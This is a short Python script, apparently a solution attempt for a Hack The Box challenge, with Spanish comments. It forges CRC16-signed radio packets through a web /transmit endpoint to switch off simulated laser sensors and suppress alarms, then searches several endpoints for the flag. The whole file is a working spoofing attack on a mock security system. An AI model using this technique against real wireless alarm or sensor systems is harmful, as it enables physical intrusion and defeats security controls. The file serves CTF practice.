#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 98: Seguir la lógica del documento EXACTAMENTE
print("[*] INNOVACIÓN 98: Lógica exacta del documento")
print("""
Según el documento:
1. Durante maintenance period, guardias salen y activan láseres (E1, E2, E3)
2. Si los láseres FALLAN, se activan las alarmas (A1, A2, A3, A4)
3. Necesito hacer que los láseres fallen y suprimir las alarmas

Secuencia lógica:
1. Los láseres YA están activados (text-success)
2. Hacer que FALLEN (enviar Turn OFF)
3. Esto activará las alarmas
4. Luego suprimir las alarmas
""")

s = requests.Session()
s.get(base_url)

print("\n[*] FASE 1: Apagar láseres para que fallen")
for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xFF])  # Turn OFF
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    print(f"  Sent Turn OFF to E{addr & 0x0F}")
    time.sleep(0.3)

print("\n[*] Esperando que las alarmas se activen...")
time.sleep(5)

r = s.get(f'{base_url}/updates')
print(f"Status: {r.text[:300]}")

print("\n[*] FASE 2: Suprimir las alarmas activadas")
for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xF1])  # Suppress
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    print(f"  Sent Suppress to A{addr & 0x0F}")
    time.sleep(0.3)

print("\n[*] Verificando resultado final...")
time.sleep(5)

for endpoint in ['/', '/updates', '/mission', '/escape', '/success']:
    try:
        r = s.get(f'{base_url}{endpoint}')
        if 'HTB{' in r.text:
            print(f"\n[SUCCESS in {endpoint}]")
            flags = re.findall(r'HTB\{[^}]+\}', r.text)
            for flag in flags:
                print(flag)
            break
        
        # Buscar keywords de éxito
        if 'success' in r.text.lower() or 'escape' in r.text.lower() or 'complete' in r.text.lower():
            print(f"\n[+] Interesting content in {endpoint}:")
            print(r.text[:500])
    except:
        pass

print("\n[*] Innovación 98 completada")
